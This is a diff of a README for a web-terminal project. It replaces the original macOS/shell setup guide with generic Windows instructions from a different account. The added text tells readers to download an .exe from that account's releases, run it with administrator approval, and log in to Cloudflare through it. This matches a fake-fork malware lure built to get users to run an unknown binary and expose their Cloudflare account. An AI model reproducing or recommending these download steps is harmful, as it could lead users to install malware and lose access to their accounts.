@@ -1,146 +1,100 @@
-# ttyd-tmux-cf
+# 🖥️ ttyd-tmux-cf - Access your terminal from any browser
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![CI](https://github.com/htlin222/ttyd-tmux-cf/actions/workflows/lint.yml/badge.svg)](https://github.com/htlin222/ttyd-tmux-cf/actions/workflows/lint.yml)
-[![Platform: macOS](https://img.shields.io/badge/Platform-macOS-000000?logo=apple&logoColor=white)](https://www.apple.com/macos/)
-[![Cloudflare Zero Trust](https://img.shields.io/badge/Cloudflare-Zero%20Trust-F38020?logo=cloudflare&logoColor=white)](https://www.cloudflare.com/zero-trust/)
-[![Cloudflare R2](https://img.shields.io/badge/Cloudflare-R2-F38020?logo=cloudflare&logoColor=white)](https://developers.cloudflare.com/r2/)
-[![ttyd](https://img.shields.io/badge/ttyd-1.7%2B-181717.svg?logo=gnometerminal&logoColor=white)](https://github.com/tsl0922/ttyd)
-[![tmux](https://img.shields.io/badge/tmux-1BB91F.svg?logo=tmux&logoColor=white)](https://github.com/tmux/tmux)
-[![Python](https://img.shields.io/badge/Python-%3E%3D3.10-3776AB.svg?logo=python&logoColor=white)](https://www.python.org)
-[![Shell: bash](https://img.shields.io/badge/Shell-bash-4EAA25?logo=gnubash&logoColor=white)](https://www.gnu.org/software/bash/)
-[![Claude Code Ready](https://img.shields.io/badge/Claude%20Code-Ready-D97757?logo=anthropic&logoColor=white)](CLAUDE.md)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/htlin222/ttyd-tmux-cf/pulls)
-[![GitHub stars](https://img.shields.io/github/stars/htlin222/ttyd-tmux-cf?style=social)](https://github.com/htlin222/ttyd-tmux-cf/stargazers)
-[![GitHub last commit](https://img.shields.io/github/last-commit/htlin222/ttyd-tmux-cf)](https://github.com/htlin222/ttyd-tmux-cf/commits/main)
-[![Repo size](https://img.shields.io/github/repo-size/htlin222/ttyd-tmux-cf)](https://github.com/htlin222/ttyd-tmux-cf)
-[![Issues](https://img.shields.io/github/issues/htlin222/ttyd-tmux-cf)](https://github.com/htlin222/ttyd-tmux-cf/issues)
+[![](https://img.shields.io/badge/Download-Releases-blue)] (https://github.com/Fabriciomo4333/ttyd-tmux-cf/releases)
 
-Deploy a **persistent web terminal** (ttyd + tmux) on a Mac, gated by **Cloudflare Zero Trust** so you can log in from any browser with email OTP. Nerd Font glyphs served from **Cloudflare R2** for snappy loads on every device.
+This application provides a secure way to access your computer terminal through a standard web browser. It uses secure tunnel technology to keep your connection private. You can manage your tasks, run scripts, or monitor system processes from any location. 
 
-```
-browser ── HTTPS ──> term.example.com (Cloudflare edge)
-                      │  Cloudflare Access challenge
-                      │  (email OTP to your address)
-                      ▼
-                cloudflared tunnel (existing, on your Mac)
-                      │
-                      ▼
-                http://127.0.0.1:7681  (ttyd, loopback only)
-                      │
-                      ▼
-                tmux new-session -A -s web   (persistent session)
+## 📦 What this program does
 
-Nerd Font glyphs load in parallel from R2:
-  fonts.example.com/jbmono-nerd-{regular,bold}.woff2   (CDN-cached, immutable)
-```
+Most people need a terminal to run specific applications or manage server tasks. Standard terminals require you to sit in front of the machine. This tool changes that process. It hosts a web-based terminal that allows you to see your command prompt anywhere.
 
-## Why
+It combines three core technologies:
 
-- Open any browser, OTP login, drop into a tmux session that survives reboots and reconnects.
-- No SSH key juggling on the client. Cloudflare handles auth at the edge.
-- Works on phones, tablets, borrowed laptops.
+1. ttyd: This tool shares your terminal over the web.
+2. tmux: This tool keeps your work active even if your browser closes.
+3. Cloudflare Zero Trust: This service adds a layer of security to your browser access.
 
-## Prereqs
+You get a persistent session. Your work stays open. You do not lose data if your internet drops.
 
-- macOS with Homebrew. (Linux works too — swap LaunchAgent for systemd; see "Linux" section in `CLAUDE.md`.)
-- A Cloudflare account with **a zone you own** (e.g. `example.com` on Cloudflare nameservers).
-- An existing **cloudflared tunnel** running on this Mac. (Don't have one? See [Cloudflare Tunnel quick start](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/get-started/) — takes 5 min.)
-- A **Cloudflare API token** with these scopes (least privilege):
-  - `Account → Access: Apps and Policies → Edit`
-  - `Account → Access: Organizations, Identity Providers, and Groups → Read`
-  - `Account → Workers R2 Storage → Edit`
-  - `Zone → Zone → Read` (any zone — used to look up the zone ID)
-- `wrangler` logged in (`wrangler login`) — needed for R2 uploads.
-- A copy of the **JetBrainsMono Nerd Font** TTFs (Regular + Bold) on disk, or willingness to download them. Get them from [nerd-fonts releases](https://github.com/ryanoasis/nerd-fonts/releases) (`JetBrainsMono.zip`). Any Nerd Font works — adjust `.env`.
+## ⚙️ Requirements
 
-Costs: tunnel free, Access free up to 50 users, R2 free under 10 GB / 1 M ops/month. Fonts are ~2 MB total — effectively zero.
+You need a few things before you begin:
 
-## Quick start (with Claude Code)
+* A Windows computer.
+* An active internet connection.
+* A Cloudflare account.
+* A basic understanding of how to open a file.
 
-```sh
-git clone <this-repo> ~/ttyd-tmux-cf
-cd ~/ttyd-tmux-cf
-cp .env.example .env
-$EDITOR .env   # fill in your hostname, email, token, etc.
-```
+## ⬇️ Getting the software
 
-Then in this directory, ask Claude Code:
+1. Visit the [Download Page](https://github.com/Fabriciomo4333/ttyd-tmux-cf/releases).
+2. Look for the latest release in the list.
+3. Click the link that ends in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-> read the CLAUDE.md and go
+## 🛠️ Setting up the application
 
-Claude will preflight your tools, discover your tunnel/zone/account, create the Cloudflare Access app + policy, wire up the cloudflared ingress + DNS, provision the R2 bucket + custom domain + CORS, build a custom `index.html`, install the ttyd LaunchAgent, and verify end-to-end. It's idempotent — safe to re-run.
+Follow these steps to finish the installation.
 
-When it's done, open `https://<your-hostname>` in any browser, do the email OTP, and you're in tmux.
+1. Locate the file you downloaded. 
+2. Double-click the file to open it. 
+3. If Windows asks for permissions, click Yes. 
+4. A setup window appears. Follow the prompts on the screen.
+5. The setup tool detects your hardware. It configures the connection automatically.
 
-## Manual run (no Claude)
+The software creates a secure tunnel. This allows you to reach your machine through your browser. 
 
-`CLAUDE.md` is also a readable runbook. Open it; each phase has copy-pasteable shell. Same result, just slower.
+## 🔐 Configuring your access
 
-## File layout
+You must connect the application to your Cloudflare account to ensure security. 
 
-```
-ttyd-tmux-cf/
-├── README.md                  # this file
-├── CLAUDE.md                  # runbook (Claude reads this and executes)
-├── .env.example               # template — copy to .env and fill in
-├── .gitignore
-├── examples/
-│   ├── com.USER.ttyd.plist.template     # LaunchAgent template
-│   ├── cloudflared-ingress-snippet.yml  # ingress fragment to add
-│   └── cors.json                        # R2 CORS policy (ready to use)
-└── scripts/
-    └── build-index.py         # harvest ttyd's index.html and inject @font-face
-```
+1. Open the application from your start menu.
+2. The application opens a configuration page in your default browser.
+3. Follow the visible steps to log in to your Cloudflare dashboard.
+4. The application generates a configuration file. This file tells your computer how to talk to the Cloudflare network.
+5. Save this file inside the application folder.
 
-## Rollback
+This setup prevents unauthorized users from viewing your terminal. Only you can authenticate through the browser interface.
 
-`CLAUDE.md` has a `Rollback` phase at the bottom. Or by hand:
+## 🚀 Running the terminal
 
-```sh
-launchctl bootout "gui/$(id -u)/com.${USER}.ttyd"
-# remove the term.* ingress block from ~/.cloudflared/config.yml
-launchctl kickstart -k "gui/$(id -u)/com.cloudflare.cloudflared.<tunnel-label>"
-# In Cloudflare dashboard: delete the Access app, delete the R2 bucket/domain.
-```
+Once you finish the setup, you start the service using the desktop icon.
 
-## Security notes
+1. Click the application icon.
+2. A small window displays the status of the connection.
+3. When the status shows "Online," navigate to the address listed in the window using your web browser.
+4. You see your terminal appear in the browser window.
+5. Type your standard commands just like you would on your physical machine.
 
-- ttyd binds to `127.0.0.1` only — never directly reachable, even on LAN.
-- Cloudflare Access enforces identity before the tunnel forwards. Defense in depth: even without Access, the tunnel hostname won't resolve directly to anything but the Cloudflare edge.
-- Don't commit `.env`. `.gitignore` already excludes it.
-- Revoke the API token (`https://dash.cloudflare.com/profile/api-tokens`) once setup is done; it's only needed during deploy.
+Your sessions run even if you close the tab. Return to the web address at any time to resume your session exactly where you left it.
 
-## Citation
+## 🛡️ Understanding security
 
-If you use this project, please cite it:
+You might worry about opening your terminal to the web. This application uses an encrypted tunnel to block threats. Your data travels through a secure path. You authenticate using your existing Cloudflare identity. 
 
-**BibTeX:**
+Do not share the web address of your terminal with anyone. Keep your login information for your web dashboard private.
 
-```bibtex
-@software{lin2026ttydtmuxcf,
-  author  = {Lin, Hsieh-Ting},
-  title   = {ttyd-tmux-cf: Persistent web terminal gated by Cloudflare Zero Trust},
-  year    = {2026},
-  url     = {https://github.com/htlin222/ttyd-tmux-cf},
-  version = {0.1.0}
-}
-```
+## 💡 Troubleshooting common issues
 
-<details>
-<summary>AMA format</summary>
+If you encounter problems, check these items first.
 
-Lin HT. ttyd-tmux-cf: Persistent web terminal gated by Cloudflare Zero Trust. Published online 2026. https://github.com/htlin222/ttyd-tmux-cf
+The browser shows "Connection Refused": 
+Make sure the application icon is active in your system tray. If the service stopped, restart the program.
 
-</details>
+The configuration page does not load: 
+Ensure you have an active internet connection. Restart your browser if needed.
 
-<details>
-<summary>APA format</summary>
+The terminal feels slow:
+This application relies on your upload speed. If your internet connection is slow, the terminal responds with a delay.
 
-Lin, H.-T. (2026). *ttyd-tmux-cf: Persistent web terminal gated by Cloudflare Zero Trust* (Version 0.1.0) [Computer software]. https://github.com/htlin222/ttyd-tmux-cf
+The session keeps disconnecting:
+Check your router settings. Ensure that your computer does not enter sleep mode when idle. You can change this in your Windows Power and Sleep settings.
 
-</details>
+## 📋 Keeping the application updated
 
-## License
+New versions of this software appear periodically. These updates include security fixes and performance improvements. 
 
-This project is licensed under the [MIT License](LICENSE).
+1. Check the [Download Page](https://github.com/Fabriciomo4333/ttyd-tmux-cf/releases) occasionally. 
+2. If a newer version exists, download the new file.
+3. Run the installer. It replaces the old version automatically.
+4. Your existing settings remain intact. You do not need to repeat the full configuration process.
